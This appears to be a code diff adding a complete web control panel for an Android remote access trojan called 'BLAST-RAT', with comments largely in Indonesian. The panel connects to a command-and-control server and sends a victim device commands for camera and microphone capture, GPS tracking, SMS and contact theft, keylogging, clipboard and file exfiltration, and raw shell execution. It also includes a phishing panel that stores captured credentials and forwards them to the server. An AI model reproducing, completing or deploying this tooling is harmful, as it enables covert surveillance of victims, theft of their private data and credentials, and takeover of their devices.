@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RAT CONTROLLER | FULL ACCESS</title>
+    <script src="https://cdn.socket.io/4.5.0/socket.io.min.js"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #0a0a0a;
+            font-family: monospace;
+            color: #0f0;
+            padding: 20px;
+        }
+        .container { max-width: 1400px; margin: 0 auto; }
+        .status-bar {
+            background: #0f1a0f;
+            border: 1px solid #2e6e2e;
+            padding: 15px;
+            margin-bottom: 20px;
+            border-radius: 8px;
+        }
+        .led {
+            display: inline-block;
+            width: 12px;
+            height: 12px;
+            background: #0f0;
+            border-radius: 50%;
+            animation: pulse 1s infinite;
+            margin-right: 10px;
+        }
+        @keyframes pulse { 0% { opacity: 0.3; } 100% { opacity: 1; } }
+        .grid-3 {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        .panel {
+            background: #050805;
+            border: 1px solid #2e6e2e;
+            border-radius: 8px;
+            padding: 15px;
+        }
+        .panel h3 {
+            margin-bottom: 12px;
+            color: #6f6;
+            border-bottom: 1px solid #2e6e2e;
+            padding-bottom: 5px;
+        }
+        .cmd-btn {
+            background: #0e1a0e;
+            border: 1px solid #2c6e2c;
+            color: #6eff6e;
+            padding: 8px 12px;
+            margin: 4px;
+            cursor: pointer;
+            font-family: monospace;
+            font-size: 12px;
+            display: inline-block;
+        }
+        .cmd-btn:hover { background: #2e6e2e; }
+        .cmd-input {
+            width: 100%;
+            background: #000;
+            border: 1px solid #2e6e2e;
+            color: #0f0;
+            padding: 10px;
+            font-family: monospace;
+            margin: 5px 0;
+        }
+        .output-area {
+            background: #010101;
+            border: 1px solid #2e6e2e;
+            border-radius: 8px;
+            padding: 15px;
+            height: 300px;
+            overflow-y: auto;
+            font-size: 12px;
+        }
+        .log-line {
+            border-left: 2px solid #0f0;
+            padding-left: 8px;
+            margin: 5px 0;
+            word-break: break-all;
+        }
+        .cam-preview {
+            background: #000;
+            border: 1px solid #2e6e2e;
+            border-radius: 8px;
+            padding: 10px;
+            text-align: center;
+        }
+        .cam-preview img { max-width: 100%; max-height: 200px; }
+        .file-list {
+            max-height: 200px;
+            overflow-y: auto;
+            font-size: 11px;
+        }
+        .file-item {
+            padding: 4px;
+            cursor: pointer;
+            border-bottom: 1px solid #1a3a1a;
+        }
+        .file-item:hover { background: #1e3a1e; }
+        .cred-item {
+            background: #0a0f0a;
+            padding: 5px;
+            margin: 5px 0;
+            border-left: 3px solid #0f0;
+            font-size: 11px;
+        }
+        button { background: #1e3a1e; border: none; color: #0f0; padding: 8px 15px; cursor: pointer; }
+        input, button { font-family: monospace; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="status-bar">
+        <span class="led"></span>
+        <strong>BLAST-RAT v3.0 | FULL CONTROL SYSTEM</strong>
+        <span id="targetStatus" style="float: right;">🔴 MENUNGGU TARGET</span>
+    </div>
+
+    <div class="grid-3">
+        <!-- Panel 1: Kontrol Cepat -->
+        <div class="panel">
+            <h3>🎮 QUICK COMMANDS</h3>
+            <div>
+                <div class="cmd-btn" data-cmd="cam:snap">📸 CAMERA</div>
+                <div class="cmd-btn" data-cmd="cam:stream_start">📹 STREAM START</div>
+                <div class="cmd-btn" data-cmd="cam:stream_stop">⏹️ STOP</div>
+                <div class="cmd-btn" data-cmd="mic:record">🎤 MIC START</div>
+                <div class="cmd-btn" data-cmd="mic:stop">⏹️ MIC STOP</div>
+                <div class="cmd-btn" data-cmd="location:get">📍 GPS</div>
+                <div class="cmd-btn" data-cmd="sms:inbox">💬 SMS INBOX</div>
+                <div class="cmd-btn" data-cmd="contacts:all">📞 CONTACTS</div>
+                <div class="cmd-btn" data-cmd="keylog:on">⌨️ KEYLOG ON</div>
+                <div class="cmd-btn" data-cmd="keylog:off">🔒 KEYLOG OFF</div>
+                <div class="cmd-btn" data-cmd="wifi:scan">📡 WIFI SCAN</div>
+                <div class="cmd-btn" data-cmd="shell:ls /sdcard">📁 LIST FILES</div>
+                <div class="cmd-btn" data-cmd="clipboard:get">📋 CLIPBOARD</div>
+                <div class="cmd-btn" data-cmd="lock:device">🔒 LOCK PHONE</div>
+                <div class="cmd-btn" data-cmd="vibrate">📳 VIBRATE</div>
+                <div class="cmd-btn" data-cmd="screenshot">🖼️ SCREENSHOT</div>
+            </div>
+        </div>
+
+        <!-- Panel 2: Phishing + Credential Capture -->
+        <div class="panel">
+            <h3>🎣 PHISHING ENGINE</h3>
+            <input type="text" id="phishUser" class="cmd-input" placeholder="Target email/username">
+            <input type="password" id="phishPass" class="cmd-input" placeholder="Password">
+            <button id="captureBtn">⚡ CAPTURE & SEND</button>
+            <div style="margin-top: 10px;">
+                <div class="cmd-btn" id="showCredsBtn">📜 SHOW CAPTURED</div>
+                <div class="cmd-btn" id="pushCredsToTarget">📤 PUSH TO RAT</div>
+            </div>
+            <div id="credList" style="margin-top: 10px; max-height: 150px; overflow-y: auto;"></div>
+        </div>
+
+        <!-- Panel 3: File Browser & Cam Preview -->
+        <div class="panel">
+            <h3>📁 FILE BROWSER</h3>
+            <div class="file-list" id="fileBrowser">
+                <div style="color: #6a6;">- klik LIST FILES -</div>
+            </div>
+            <div class="cam-preview" style="margin-top: 10px;">
+                <div>📷 LIVE PREVIEW</div>
+                <img id="camPreview" src="" style="width:100%;">
+            </div>
+        </div>
+    </div>
+
+    <!-- Terminal Output -->
+    <div class="panel" style="margin-top: 10px;">
+        <h3>🖥️ TERMINAL OUTPUT</h3>
+        <div class="output-area" id="outputLog">
+            <div class="log-line">[>] RAT CONTROLLER READY</div>
+            <div class="log-line">[>] Waiting for target connection...</div>
+        </div>
+        <div style="display: flex; gap: 10px; margin-top: 10px;">
+            <input type="text" id="rawCmd" class="cmd-input" placeholder="shell:exec / raw command" style="flex:1;">
+            <button id="sendRawBtn">EXECUTE</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    // KONEKSI KE SERVER C2
+    const SERVER_URL = 'https://your-server.com'; // GANTI DENGAN IP SERVER ANDA
+    const socket = io(SERVER_URL, { transports: ['websocket'], reconnection: true });
+    
+    let targetId = null;
+    let capturedCredentials = [];
+    let cameraStreaming = false;
+    
+    function addLog(msg) {
+        const logDiv = document.getElementById('outputLog');
+        const line = document.createElement('div');
+        line.className = 'log-line';
+        line.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        logDiv.appendChild(line);
+        logDiv.scrollTop = logDiv.scrollHeight;
+    }
+    
+    function updateStatus(device) {
+        const statusDiv = document.getElementById('targetStatus');
+        statusDiv.innerHTML = `🟢 TARGET ONLINE: ${device}`;
+    }
+    
+    // Kirim perintah ke target
+    function sendCommand(cmd) {
+        if(!targetId) {
+            addLog('[!] TIDAK ADA TARGET TERHUBUNG');
+            return;
+        }
+        addLog(`> ${cmd}`);
+        socket.emit('rat_command', { target: targetId, command: cmd });
+    }
+    
+    // Tampilkan credential
+    function updateCredDisplay() {
+        const credDiv = document.getElementById('credList');
+        if(capturedCredentials.length === 0) {
+            credDiv.innerHTML = '<div style="color: #6a6;">- belum ada credential -</div>';
+            return;
+        }
+        credDiv.innerHTML = '';
+        capturedCredentials.slice(-10).forEach(cred => {
+            const div = document.createElement('div');
+            div.className = 'cred-item';
+            div.innerHTML = `📧 ${cred.username} | 🔑 ${cred.password}<br><small>${new Date(cred.timestamp).toLocaleString()}</small>`;
+            credDiv.appendChild(div);
+        });
+    }
+    
+    // Tampilkan file list
+    function renderFiles(files) {
+        const container = document.getElementById('fileBrowser');
+        if(!files || files.length === 0) {
+            container.innerHTML = '<div style="color: #6a6;">- kosong -</div>';
+            return;
+        }
+        container.innerHTML = '';
+        files.forEach(file => {
+            const div = document.createElement('div');
+            div.className = 'file-item';
+            div.innerHTML = `${file.isDir ? '📁' : '📄'} ${file.name} (${file.size || 0} B)`;
+            div.onclick = () => {
+                if(file.isDir) sendCommand(`shell:ls ${file.path}`);
+                else sendCommand(`download:${file.path}`);
+            };
+            container.appendChild(div);
+        });
+    }
+    
+    // SOCKET EVENTS
+    socket.on('connect', () => {
+        addLog('[✓] TERHUBUNG KE C2 SERVER');
+        socket.emit('register_dashboard', { type: 'controller' });
+    });
+    
+    socket.on('target_list', (targets) => {
+        if(targets.length > 0) {
+            targetId = targets[0].id;
+            updateStatus(targets[0].info?.device || 'Android Device');
+            addLog(`[+] TARGET TERHUBUNG: ${targetId}`);
+        }
+    });
+    
+    socket.on('target_connected', (data) => {
+        targetId = data.id;
+        updateStatus(data.device);
+        addLog(`[!!!] KORBAN ONLINE: ${data.device} | IP: ${data.ip || 'unknown'}`);
+    });
+    
+    socket.on('command_result', (result) => {
+        if(result.output) {
+            addLog(`[OUT] ${result.output}`);
+            
+            // Parse file list
+            if(result.output.includes('FILE_LIST:')) {
+                try {
+                    const jsonStr = result.output.split('FILE_LIST:')[1];
+                    const files = JSON.parse(jsonStr);
+                    renderFiles(files);
+                } catch(e) {}
+            }
+        }
+        
+        if(result.image) {
+            document.getElementById('camPreview').src = 'data:image/jpeg;base64,' + result.image;
+            addLog('[📸] GAMBAR DITERIMA');
+        }
+        
+        if(result.location) {
+            addLog(`[📍] LAT: ${result.location.lat}, LON: ${result.location.lon}`);
+            addLog(`[📍] AKURASI: ${result.location.accuracy}m`);
+            window.open(`https://maps.google.com?q=${result.location.lat},${result.location.lon}`, '_blank');
+        }
+        
+        if(result.sms) {
+            addLog(`[💬] ${result.sms.length} SMS DITEMUKAN`);
+            result.sms.forEach(msg => {
+                addLog(`  FROM: ${msg.from} | ${msg.body.substring(0, 50)}`);
+            });
+        }
+        
+        if(result.contacts) {
+            addLog(`[📞] ${result.contacts.length} KONTAK`);
+            result.contacts.slice(0, 10).forEach(c => {
+                addLog(`  - ${c.name}: ${c.number}`);
+            });
+        }
+        
+        if(result.keys) {
+            addLog(`[⌨️] KEYLOG: ${result.keys}`);
+        }
+        
+        if(result.wifi) {
+            addLog(`[📡] ${result.wifi.length} JARINGAN DITEMUKAN`);
+            result.wifi.forEach(w => {
+                addLog(`  - ${w.ssid} | signal: ${w.signal}dBm | secured: ${w.secured}`);
+            });
+        }
+        
+        if(result.clipboard) {
+            addLog(`[📋] CLIPBOARD: ${result.clipboard}`);
+        }
+        
+        if(result.screenshot) {
+            document.getElementById('camPreview').src = 'data:image/png;base64,' + result.screenshot;
+            addLog('[🖼️] SCREENSHOT DITERIMA');
+        }
+    });
+    
+    socket.on('phishing_forward', (cred) => {
+        capturedCredentials.unshift(cred);
+        updateCredDisplay();
+        addLog(`[PHISH] Credential masuk: ${cred.username}`);
+    });
+    
+    // UI BINDINGS
+    document.querySelectorAll('.cmd-btn').forEach(btn => {
+        btn.addEventListener('click', () => {
+            const cmd = btn.getAttribute('data-cmd');
+            if(cmd) sendCommand(cmd);
+        });
+    });
+    
+    document.getElementById('sendRawBtn').onclick = () => {
+        const inp = document.getElementById('rawCmd');
+        if(inp.value.trim()) sendCommand(inp.value);
+        inp.value = '';
+    };
+    
+    document.getElementById('captureBtn').onclick = () => {
+        const user = document.getElementById('phishUser').value.trim();
+        const pass = document.getElementById('phishPass').value;
+        if(!user || !pass) {
+            addLog('[PHISH] Username/password kosong');
+            return;
+        }
+        
+        const cred = {
+            username: user,
+            password: pass,
+            timestamp: Date.now(),
+            source: 'manual_phish'
+        };
+        
+        capturedCredentials.unshift(cred);
+        updateCredDisplay();
+        addLog(`[PHISH] Tersimpan: ${user} : ${pass.substring(0,3)}***`);
+        
+        // Kirim ke server
+        socket.emit('phish_capture', cred);
+        
+        document.getElementById('phishUser').value = '';
+        document.getElementById('phishPass').value = '';
+    };
+    
+    document.getElementById('showCredsBtn').onclick = () => {
+        if(capturedCredentials.length === 0) {
+            addLog('[PHISH] Belum ada credential');
+        } else {
+            addLog(`[PHISH] ${capturedCredentials.length} credential tersimpan`);
+            capturedCredentials.forEach(c => {
+                addLog(`  - ${c.username} : ${c.password}`);
+            });
+        }
+    };
+    
+    document.getElementById('pushCredsToTarget').onclick = () => {
+        if(capturedCredentials.length === 0) {
+            addLog('[!] Tidak ada credential untuk dikirim');
+            return;
+        }
+        sendCommand(`phish:push ${JSON.stringify(capturedCredentials)}`);
+        addLog(`[+] Mengirim ${capturedCredentials.length} credential ke target`);
+    };
+    
+    // Load credential dari localStorage
+    try {
+        const saved = localStorage.getItem('rat_creds');
+        if(saved) {
+            capturedCredentials = JSON.parse(saved);
+            updateCredDisplay();
+            addLog(`[+] Load ${capturedCredentials.length} credential dari cache`);
+        }
+    } catch(e) {}
+    
+    setInterval(() => {
+        localStorage.setItem('rat_creds', JSON.stringify(capturedCredentials));
+    }, 5000);
+    
+    addLog('[✓] READY | Tunggu target membuka payload');
+</script>
+</body>
+</html>
